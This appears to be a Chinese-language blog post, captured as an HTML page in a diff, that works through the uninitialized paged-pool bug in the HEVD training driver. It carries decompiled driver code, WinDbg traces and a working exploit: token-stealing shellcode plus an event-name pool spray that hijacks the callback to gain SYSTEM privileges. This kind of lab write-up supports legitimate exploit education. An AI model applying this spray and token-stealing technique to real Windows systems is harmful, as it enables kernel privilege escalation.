@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="hevd windows内核漏洞练习-UNINITIALIZED_MEMORY_PAGED_POOL1.漏洞分析未初始化分页内存漏洞.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hevd windows内核漏洞练习-UNINITIALIZED_MEMORY_PAGED_POOL">
+<meta property="og:url" content="http://example.com/2023/07/17/hevd-windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0-UNINITIALIZED_MEMORY_PAGED_POOL/index.html">
+<meta property="og:site_name" content="Ash blog">
+<meta property="og:description" content="hevd windows内核漏洞练习-UNINITIALIZED_MEMORY_PAGED_POOL1.漏洞分析未初始化分页内存漏洞.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2023/07/17/hevd-windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0-UNINITIALIZED_MEMORY_PAGED_POOL/image-20230717154759056.png">
+<meta property="article:published_time" content="2023-07-17T04:10:12.527Z">
+<meta property="article:modified_time" content="2023-07-17T07:48:41.651Z">
+<meta property="article:author" content="Ash">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/07/17/hevd-windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0-UNINITIALIZED_MEMORY_PAGED_POOL/image-20230717154759056.png">
+
+<link rel="canonical" href="http://example.com/2023/07/17/hevd-windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0-UNINITIALIZED_MEMORY_PAGED_POOL/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>hevd windows内核漏洞练习-UNINITIALIZED_MEMORY_PAGED_POOL | Ash blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Ash blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/17/hevd-windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0-UNINITIALIZED_MEMORY_PAGED_POOL/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Ash">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ash blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          hevd windows内核漏洞练习-UNINITIALIZED_MEMORY_PAGED_POOL
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-07-17 12:10:12 / 修改时间：15:48:41" itemprop="dateCreated datePublished" datetime="2023-07-17T12:10:12+08:00">2023-07-17</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="hevd-windows内核漏洞练习-UNINITIALIZED-MEMORY-PAGED-POOL"><a href="#hevd-windows内核漏洞练习-UNINITIALIZED-MEMORY-PAGED-POOL" class="headerlink" title="hevd windows内核漏洞练习-UNINITIALIZED_MEMORY_PAGED_POOL"></a>hevd windows内核漏洞练习-UNINITIALIZED_MEMORY_PAGED_POOL</h1><h2 id="1-漏洞分析"><a href="#1-漏洞分析" class="headerlink" title="1.漏洞分析"></a>1.漏洞分析</h2><p>未初始化分页内存漏洞.</p>
+<p>首先申请了一块0xf0长度的分页池内存UninitializedMemory,如果userbuf中的值为0x0xBAD0B0B0,</p>
+<p>那么就设置UninitializedMemory-&gt;Callback的回调为UninitializedMemoryPagedPoolObjectCallback.</p>
+<p>否则因为未进行初始化,就会调用到一个未知的callback地址.</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __stdcall <span class="title">TriggerUninitializedMemoryPagedPool</span><span class="params">(<span class="type">const</span> <span class="type">void</span> **UserBuffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *v2; <span class="comment">// esi</span></span><br><span class="line">  _UNINITIALIZED_MEMORY_POOL *UninitializedMemory; <span class="comment">// [esp+14h] [ebp-1Ch] BYREF</span></span><br><span class="line">  CPPEH_RECORD ms_exc; <span class="comment">// [esp+18h] [ebp-18h]</span></span><br><span class="line"></span><br><span class="line">  ms_exc.registration.TryLevel = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">ProbeForRead</span>(UserBuffer, <span class="number">0xF0</span>u, <span class="number">1u</span>);</span><br><span class="line">  UninitializedMemory = (_UNINITIALIZED_MEMORY_POOL *)<span class="built_in">ExAllocatePoolWithTag</span>(PagedPool, <span class="number">0xF0</span>u, <span class="string">&#x27;kcaH&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( UninitializedMemory )</span><br><span class="line">  &#123;</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Tag: %s\n&quot;</span>, <span class="string">&quot;&#x27;kcaH&#x27;&quot;</span>);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Type: %s\n&quot;</span>, <span class="string">&quot;PagedPool&quot;</span>);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Size: 0x%X\n&quot;</span>, <span class="number">0xF0</span>);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Pool Chunk: 0x%p\n&quot;</span>, UninitializedMemory);</span><br><span class="line">    v2 = *UserBuffer;</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UserValue: 0x%p\n&quot;</span>, *UserBuffer);</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UninitializedMemory Address: 0x%p\n&quot;</span>, &amp;UninitializedMemory);</span><br><span class="line">    <span class="keyword">if</span> ( v2 == (<span class="type">const</span> <span class="type">void</span> *)<span class="number">0xBAD0B0B0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      UninitializedMemory-&gt;Value = <span class="number">0xBAD0B0B0</span>;</span><br><span class="line">      UninitializedMemory-&gt;Callback = (<span class="built_in">void</span> (__stdcall *)())UninitializedMemoryPagedPoolObjectCallback;</span><br><span class="line">      <span class="built_in">memset</span>(UninitializedMemory-&gt;Buffer, <span class="number">0x41</span>, <span class="built_in">sizeof</span>(UninitializedMemory-&gt;Buffer));</span><br><span class="line">      UninitializedMemory-&gt;Buffer[<span class="number">0x39</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] Triggering Uninitialized Memory in PagedPool\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( UninitializedMemory )</span><br><span class="line">    &#123;</span><br><span class="line">      _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UninitializedMemory-&gt;Value: 0x%p\n&quot;</span>, (<span class="type">const</span> <span class="type">void</span> *)UninitializedMemory-&gt;Value);</span><br><span class="line">      _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[+] UninitializedMemory-&gt;Callback: 0x%p\n&quot;</span>, UninitializedMemory-&gt;Callback);</span><br><span class="line">      UninitializedMemory-&gt;<span class="built_in">Callback</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    _DbgPrintEx(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;[-] Unable to allocate Pool chunk\n&quot;</span>);</span><br><span class="line">    ms_exc.registration.TryLevel = <span class="number">0xFFFFFFFE</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xC0000017</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>它这里还注册了一个seh,输出错误码.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PAGE:00445F92</span><br><span class="line">PAGE:00445F92 $LN10_3:</span><br><span class="line">PAGE:00445F92 ;   __except($LN9_12) // owned by 445E5B</span><br><span class="line">PAGE:00445F92 mov     esp, [ebp+ms_exc.old_esp]</span><br><span class="line">PAGE:00445F95 mov     edi, [ebp+var_20]</span><br><span class="line">PAGE:00445F98 push    edi</span><br><span class="line">PAGE:00445F99 push    offset aExceptionCode0 ; &quot;[-] Exception Code: 0x%X\n&quot;</span><br><span class="line">PAGE:00445F9E push    3               ; Level</span><br><span class="line">PAGE:00445FA0 push    4Dh ; &#x27;M&#x27;       ; ComponentId</span><br><span class="line">PAGE:00445FA2 call    ds:__imp__DbgPrintEx</span><br><span class="line">PAGE:00445FA8 add     esp, 10h</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h2><p>首先编写一个测试程序,userbuf的值不为0xBAD0B0B0,看看结果.</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">UNINITIALIZED_MEMORY_PAGED_POOL_test</span><span class="params">(HANDLE dev)</span> </span>&#123;</span><br><span class="line">	DWORD dwRet = <span class="number">0</span>;</span><br><span class="line">	DWORD bufLen = <span class="number">0x4</span>;</span><br><span class="line">	CHAR buf[<span class="number">0x4</span>];</span><br><span class="line">	*(DWORD*)buf = <span class="number">0xBAD0B0B0</span> + <span class="number">1</span>;</span><br><span class="line">	<span class="built_in">DeviceIoControl</span>(dev, HEVD_IOCTL_UNINITIALIZED_MEMORY_PAGED_POOL, buf, bufLen, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;dwRet, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>callback里面是个无法的访问的地址0x00430050.出现了异常.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">HEVD!TriggerUninitializedMemoryPagedPool:</span><br><span class="line">92f57e4a 6a10            push    10h</span><br><span class="line">kd&gt; g</span><br><span class="line">[+] Pool Tag: &#x27;kcaH&#x27;</span><br><span class="line">[+] Pool Type: PagedPool</span><br><span class="line">[+] Pool Size: 0xF0</span><br><span class="line">[+] Pool Chunk: 0x9BF47DB8</span><br><span class="line">[+] UserValue: 0xBAD0B0B1</span><br><span class="line">[+] UninitializedMemory Address: 0x83A13A98</span><br><span class="line">[+] Triggering Uninitialized Memory in PagedPool</span><br><span class="line">[+] UninitializedMemory-&gt;Value: 0x00000000</span><br><span class="line">[+] UninitializedMemory-&gt;Callback: 0x00430050</span><br><span class="line">[-] Exception Code: 0xC0000005</span><br><span class="line">****** HEVD_IOCTL_UNINITIALIZED_MEMORY_PAGED_POOL ******s</span><br><span class="line">kd&gt; dd 0x00430050</span><br><span class="line">00430050  ???????? ???????? ???????? ????????</span><br><span class="line">00430060  ???????? ???????? ???????? ????????</span><br><span class="line">00430070  ???????? ???????? ???????? ????????</span><br><span class="line">00430080  ???????? ???????? ???????? ????????</span><br><span class="line">00430090  ???????? ???????? ???????? ????????</span><br><span class="line">004300a0  ???????? ???????? ???????? ????????</span><br><span class="line">004300b0  ???????? ???????? ???????? ????????</span><br><span class="line">004300c0  ???????? ???????? ???????? ????????</span><br></pre></td></tr></table></figure>
+
+<p>接下来就要开始构造分页池内存,让callback可以直接调用到shellcode.</p>
+<p>UninitializedMemory的分页池内存长度为0xf0,使用ExAllocatePoolWithTag分配内存时,如果长度小于256字节,系统会从KPRCB中的PPPagedLookasideList链表中中进行分配,链表有32个节点,每一个节点都是相同块组成的单向链表.最多有256个块.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+0x620 PPNPagedLookasideList : [32] _GENERAL_LOOKASIDE_POOL</span><br><span class="line">+0xf20 PPPagedLookasideList : [32] _GENERAL_LOOKASIDE_POOL</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _GENERAL_LOOKASIDE_POOL</span><br><span class="line">nt!_GENERAL_LOOKASIDE_POOL</span><br><span class="line">   +0x000 ListHead         : _SLIST_HEADER</span><br><span class="line">   +0x000 SingleListHead   : _SINGLE_LIST_ENTRY</span><br><span class="line">   +0x008 Depth            : Uint2B</span><br><span class="line">   +0x00a MaximumDepth     : Uint2B</span><br><span class="line">   +0x00c TotalAllocates   : Uint4B</span><br><span class="line">   +0x010 AllocateMisses   : Uint4B</span><br><span class="line">   +0x010 AllocateHits     : Uint4B</span><br><span class="line">   +0x014 TotalFrees       : Uint4B</span><br><span class="line">   +0x018 FreeMisses       : Uint4B</span><br><span class="line">   +0x018 FreeHits         : Uint4B</span><br><span class="line">   +0x01c Type             : _POOL_TYPE</span><br><span class="line">   +0x020 Tag              : Uint4B</span><br><span class="line">   +0x024 Size             : Uint4B</span><br><span class="line">   +0x028 AllocateEx       : Ptr32     void* </span><br><span class="line">   +0x028 Allocate         : Ptr32     void* </span><br><span class="line">   +0x02c FreeEx           : Ptr32     void </span><br><span class="line">   +0x02c Free             : Ptr32     void </span><br><span class="line">   +0x030 ListEntry        : _LIST_ENTRY</span><br><span class="line">   +0x038 LastTotalAllocates : Uint4B</span><br><span class="line">   +0x03c LastAllocateMisses : Uint4B</span><br><span class="line">   +0x03c LastAllocateHits : Uint4B</span><br><span class="line">   +0x040 Future           : [2] Uint4B</span><br></pre></td></tr></table></figure>
+
+<p>UninitializedMemory的大小为0xf0,也就是240字节,加上8字节的_POOL_HEADER就是248,小于256,所以会分配在</p>
+<p>Lookaside List中,+4处要是我们的shellcode.</p>
+<p>同样的,上篇中用了Event对象构造非分页内存池,同样也可以用它构造分页内存池,虽然event对象在非分页内存池,但是它的参数lpName实际上是分配在分页内存池中的.</p>
+<p>通过使用256个长度为0xf0字节lpName占满Lookaside List,+4处设置为shellcode.然后释放掉,这样ExAllocatePoolWithTag申请的内存就会在我们释放的位置了.就可以执行到shellcode.</p>
+<p>编写exp如下</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">shellcode2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	__asm &#123;</span><br><span class="line">		pop edi</span><br><span class="line">		pop esi</span><br><span class="line">		pop ebx</span><br><span class="line">		pushad</span><br><span class="line">		<span class="keyword">xor</span> eax, eax</span><br><span class="line">		mov eax, fs: [<span class="number">124</span>h]</span><br><span class="line">		mov eax, [eax + <span class="number">050</span>h]</span><br><span class="line">		mov ecx, eax</span><br><span class="line">		mov edx, <span class="number">4</span></span><br><span class="line"></span><br><span class="line">		find_sys_pid :</span><br><span class="line">		mov eax, [eax + <span class="number">0b</span>8h]</span><br><span class="line">		sub eax, <span class="number">0b</span>8h</span><br><span class="line">		cmp[eax + <span class="number">0b</span>4h], edx</span><br><span class="line">		jnz find_sys_pid</span><br><span class="line"></span><br><span class="line">		mov edx, [eax + <span class="number">0f</span>8h]</span><br><span class="line">		mov[ecx + <span class="number">0f</span>8h], edx</span><br><span class="line">		popad</span><br><span class="line">		<span class="keyword">xor</span> eax, eax</span><br><span class="line">		ret</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">UNINITIALIZED_MEMORY_PAGED_POOL</span><span class="params">(HANDLE dev)</span> </span>&#123;</span><br><span class="line">	DWORD dwRet = <span class="number">0</span>;</span><br><span class="line">	DWORD bufLen = <span class="number">0x4</span>;</span><br><span class="line">	CHAR buf[<span class="number">0x4</span>];</span><br><span class="line">	*(DWORD*)buf = <span class="number">0xBAD0B0B0</span> + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	HANDLE sprayHeapEvent[<span class="number">256</span>];</span><br><span class="line">	CHAR* eventName = (CHAR*)<span class="built_in">malloc</span>(<span class="number">0xf0</span>);</span><br><span class="line">	<span class="built_in">memset</span>(eventName, <span class="number">0x41</span>, <span class="number">0xf0</span>);</span><br><span class="line">	*(DWORD*)(eventName + <span class="number">4</span>) = (DWORD)&amp;shellcode2;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">1</span>; i &lt; <span class="number">256</span>; i++, j++) &#123;</span><br><span class="line">		<span class="type">int</span> value = i + <span class="number">1</span>;</span><br><span class="line">		*(DWORD*)(eventName + <span class="number">0xec</span>) = j;</span><br><span class="line">		sprayHeapEvent[i] = <span class="built_in">CreateEventW</span>(<span class="literal">NULL</span>, FALSE, FALSE, (LPCWSTR)eventName);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">CloseHandle</span>(sprayHeapEvent[i]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">DeviceIoControl</span>(dev, HEVD_IOCTL_UNINITIALIZED_MEMORY_PAGED_POOL, buf, bufLen, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;dwRet, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看下效果,可以看到,ExAllocatePoolWithTag申请到了我们释放的内存.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; p</span><br><span class="line">HEVD!TriggerUninitializedMemoryPagedPool+0x2e:</span><br><span class="line">92f57e78 ff151c40f192    call    dword ptr [HEVD!_imp__ExAllocatePoolWithTag (92f1401c)]</span><br><span class="line">kd&gt; p</span><br><span class="line">HEVD!TriggerUninitializedMemoryPagedPool+0x34:</span><br><span class="line">92f57e7e 8945e4          mov     dword ptr [ebp-1Ch],eax</span><br><span class="line">kd&gt; dd eax</span><br><span class="line">9b0ca3e8  00000000 011c1040 41414141 41414141</span><br><span class="line">9b0ca3f8  41414141 41414141 41414141 41414141</span><br><span class="line">9b0ca408  41414141 41414141 41414141 41414141</span><br><span class="line">9b0ca418  41414141 41414141 41414141 41414141</span><br><span class="line">9b0ca428  41414141 41414141 41414141 41414141</span><br><span class="line">9b0ca438  41414141 41414141 41414141 41414141</span><br><span class="line">9b0ca448  41414141 41414141 41414141 41414141</span><br><span class="line">9b0ca458  41414141 41414141 41414141 41414141</span><br><span class="line">kd&gt; g</span><br><span class="line">[+] Pool Tag: &#x27;kcaH&#x27;</span><br><span class="line">[+] Pool Type: PagedPool</span><br><span class="line">[+] Pool Size: 0xF0</span><br><span class="line">[+] Pool Chunk: 0x9B0CA3E8</span><br><span class="line">[+] UserValue: 0xBAD0B0B1</span><br><span class="line">[+] UninitializedMemory Address: 0x83B7BA98</span><br><span class="line">[+] Triggering Uninitialized Memory in PagedPool</span><br><span class="line">[+] UninitializedMemory-&gt;Value: 0x00000000</span><br><span class="line">[+] UninitializedMemory-&gt;Callback: 0x011C1040</span><br><span class="line">****** HEVD_IOCTL_UNINITIALIZED_MEMORY_PAGED_POOL ******</span><br></pre></td></tr></table></figure>
+
+<p>提权成功</p>
+<p><img src="/2023/07/17/hevd-windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0-UNINITIALIZED_MEMORY_PAGED_POOL/image-20230717154759056.png" alt="image-20230717154759056"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/07/16/hevd-windows%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E7%BB%83%E4%B9%A0-BUFFER_OVERFLOW_NON_PAGED_POOL/" rel="prev" title="hevd windows内核漏洞练习-BUFFER_OVERFLOW_NON_PAGED_POOL">
+      <i class="fa fa-chevron-left"></i> hevd windows内核漏洞练习-BUFFER_OVERFLOW_NON_PAGED_POOL
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
